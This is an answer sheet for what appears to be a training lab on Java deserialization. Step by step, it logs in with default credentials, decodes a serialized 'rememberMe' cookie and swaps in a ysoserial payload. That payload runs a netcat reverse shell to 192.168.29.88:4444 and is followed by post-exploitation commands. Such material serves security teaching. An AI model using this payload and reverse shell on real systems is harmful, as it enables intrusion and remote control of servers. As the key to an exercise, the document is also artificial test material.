# Java Deserialization Answersheet

**Step 1:**Click on "Java Website: 16661" link
![Usage](1.png)
<br /> <br />

**Step 2:**Provide the following credential and tick the "Remember Me" option and click on Submit button.
```
Username: admin
Password: password
```
Note: The registration functionality is disabled for this application.
![Usage](2.png)
<br /> <br />

**Step 3:**Capture the HTTP request and send this request to repeater "Right Click -> Send to Repeater".
![Usage](3.png)
<br /> <br />

**Step 4:**Click on "send" button and observe that the server respond with "rememberMe" cookie which has java serialized magic string starting with "rO0".
![Usage](4.png)
<br /> <br />

**Step 5:**Observe the serialized value after decode it with Base64.
![Usage](5.png)
<br /> <br />

**Step 6:**Forward the request captured in **Step 3** and click on "Login" button.
![Usage](6.png)
<br /> <br />

**Step 7:**Download the YSoSerial utility from following location, and use the following command to check the payload available.
https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
```
java -jar ysoserial-master-SNAPSHOT.jar
```
![Usage](7.png)
<br /> <br />

**Step 8:**Capture the IP address and use that to generate the reverse shell payload using following command and capture the generated payload.
```
java -jar ysoserial-master-SNAPSHOT.jar CommonCollections4 "nc 192.168.29.88 4444 -e /bin/bash" | base64 -w 0
```
![Usage](8.png)
<br /> <br />

**Step 9:**Start the listener using following command
```
nc -nlvp 4444
```
![Usage](9.png)
<br /> <br />

**Step 10:**Replace the payload generated in **Step 8** in "RememberMe" parameter and click on "send" button to send request to the server.
![Usage](10.png)
<br /> <br />

**Step 11:**Received the reverse shell and obtained the server information using whoami, uname -a, ifconfig.
![Usage](11.png)
<br /> <br />